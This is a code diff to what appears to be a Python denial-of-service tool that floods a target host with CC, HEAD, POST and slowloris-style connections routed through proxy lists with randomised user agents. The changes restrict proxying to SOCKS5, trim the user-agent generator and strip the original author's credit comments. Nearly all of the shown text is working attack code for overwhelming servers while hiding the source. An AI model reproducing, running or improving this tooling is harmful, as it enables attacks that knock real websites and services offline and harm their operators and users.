@@ -78,13 +78,11 @@ def build_threads(mode,thread_num,event,socks_type,ind_rlock):
 			th.start()
 
 def getuseragent():
-	platform = Choice(['Macintosh', 'Windows', 'X11'])
+	platform = Choice(['Macintosh', 'Windows'])
 	if platform == 'Macintosh':
 		os  = Choice(['68K', 'PPC', 'Intel Mac OS X'])
 	elif platform == 'Windows':
 		os  = Choice(['Win3.11', 'WinNT3.51', 'WinNT4.0', 'Windows NT 5.0', 'Windows NT 5.1', 'Windows NT 5.2', 'Windows NT 6.0', 'Windows NT 6.1', 'Windows NT 6.2', 'Win 9x 4.90', 'WindowsCE', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows NT 10.0; Win64; x64'])
-	elif platform == 'X11':
-		os  = Choice(['Linux i686', 'Linux x86_64'])
 	browser = Choice(['chrome', 'firefox', 'ie'])
 	if browser == 'chrome':
 		webkit = str(Intn(500, 599))
@@ -225,10 +223,7 @@ def cc(event,socks_type,ind_rlock):
 	while True:
 		try:
 			s = socks.socksocket()
-			if socks_type == 4:
-				s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
-			if socks_type == 5:
-				s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
+			s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
 			if brute:
 				s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
 			s.connect((str(target), int(port)))
@@ -266,10 +261,7 @@ def head(event,socks_type,ind_rlock):#HEAD MODE
 	while True:
 		try:
 			s = socks.socksocket()
-			if socks_type == 4:
-				s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
-			if socks_type == 5:
-				s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
+			s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
 			if brute:
 				s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
 			s.connect((str(target), int(port)))
@@ -304,10 +296,7 @@ def post(event,socks_type,ind_rlock):
 	while True:
 		try:
 			s = socks.socksocket()
-			if socks_type == 4:
-				s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
-			if socks_type == 5:
-				s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
+			s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
 			if brute:
 				s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
 			s.connect((str(target), int(port)))
@@ -338,10 +327,7 @@ def slow(conn,socks_type):
 	for _ in range(conn):
 		try:
 			s = socks.socksocket()
-			if socks_type == 4:
-				s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
-			if socks_type == 5:
-				s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
+			s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
 			s.settimeout(1)
 			s.connect((str(target), int(port)))
 			if str(port) == '443':
@@ -376,10 +362,7 @@ def slow(conn,socks_type):
 		proxy = Choice(proxies).strip().split(":")
 		for _ in range(conn - len(socket_list)):
 			try:
-				if socks_type == 4:
-					s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
-				if socks_type == 5:
-					s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
+				s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
 				s.settimeout(1)
 				s.connect((str(target), int(port)))
 				if int(port) == 443:
@@ -400,7 +383,7 @@ def slow(conn,socks_type):
 				sys.stdout.flush()
 				pass
 nums = 0
-def checking(lines,socks_type,ms,rlock,):#Proxy checker coded by BlueSkyXN
+def checking(lines,socks_type,ms,rlock,):
 	global nums
 	global proxies
 	proxy = lines.strip().split(":")
@@ -418,10 +401,7 @@ def checking(lines,socks_type,ms,rlock,):#Proxy checker coded by BlueSkyXN
 			break
 		try:
 			s = socks.socksocket()
-			if socks_type == 4:
-				s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
-			if socks_type == 5:
-				s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
+			s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
 			s.settimeout(ms)
 			s.connect((str(target), int(port)))
 			if protocol == "https":
@@ -436,17 +416,13 @@ def checking(lines,socks_type,ms,rlock,):#Proxy checker coded by BlueSkyXN
 			err +=1
 	nums += 1
 
-def check_socks(ms):#Coded by BlueSkyXN
+def check_socks(ms):
 	global nums
 	thread_list=[]
 	rlock = threading.RLock()
 	for lines in list(proxies):
-		if choice == "5":
-			th = threading.Thread(target=checking,args=(lines,5,ms,rlock,))
-			th.start()
-		if choice == "4":
-			th = threading.Thread(target=checking,args=(lines,4,ms,rlock,))
-			th.start()
+		th = threading.Thread(target=checking,args=(lines,5,ms,rlock,))
+		th.start()
 		thread_list.append(th)
 		time.sleep(0.01)
 		sys.stdout.write("> Checked "+str(nums)+" proxies\r")
